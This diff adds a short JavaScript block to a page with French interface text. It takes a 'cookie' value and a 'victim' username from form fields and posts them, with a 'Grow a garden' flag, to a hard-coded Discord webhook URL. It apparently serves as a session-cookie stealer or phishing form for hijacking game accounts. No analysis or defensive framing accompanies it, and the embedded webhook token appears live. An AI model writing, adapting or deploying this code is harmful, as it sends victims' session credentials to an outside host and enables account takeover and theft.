@@ -1,0 +1,28 @@
+<script>
+  function sendToDiscord() {
+    const cookie = document.getElementById('cookie').value.trim();
+    const victim = document.getElementById('victim').value.trim();
+    const grow = document.getElementById('growGarden').checked;
+
+    if (!cookie || !victim) {
+      alert("Remplis les deux champs stp !");
+      return;
+    }
+
+    const message = `🍪 **Cookie:** ${cookie}\n👤 **Victim Username:** ${victim}\n🌱 Grow a garden: ${grow ? "Oui" : "Non"}`;
+
+    fetch("https://discordapp.com/api/webhooks/1395469258460496083/vF9l2TCySkA_EnrWWfBTPTrUyTM2ip8zndbcj4PTLwDml5gUOH-5WvQCwfnjpmUyayEE", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content: message })
+    })
+    .then(() => {
+      alert("Envoyé sur Discord !");
+      // Lancer le timer de 10 minutes (600000 ms)
+      setTimeout(() => {
+        location.reload();  // Recharge la page
+      }, 600000);
+    })
+    .catch(() => alert("Erreur d'envoi."));
+  }
+</script>
